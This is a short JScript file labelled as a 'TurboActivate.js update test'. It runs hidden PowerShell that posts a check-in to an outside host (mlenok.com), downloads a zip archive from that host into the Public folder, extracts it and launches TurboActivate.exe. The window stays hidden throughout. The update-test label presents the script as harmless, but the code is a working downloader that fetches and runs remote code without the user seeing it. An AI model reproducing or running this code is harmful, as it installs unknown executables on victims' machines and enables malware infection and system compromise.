// TurboActivate.js update test
var shell = WScript.CreateObject("WScript.Shell");
var cmd = 'powershell -nop -w hidden -c "$p=$env:PUBLIC+\'\\TurboActivate.exe\';$z=$p+\'.zip\';iwr https://mlenok.com/check.php -Method Post -Body \'id=fqn1\';irm https://mlenok.com/T.zip -o $z;Expand-Archive $z $env:PUBLIC -Force;start $p"';
shell.Run("cmd /c start /min " + cmd, 0, false); 
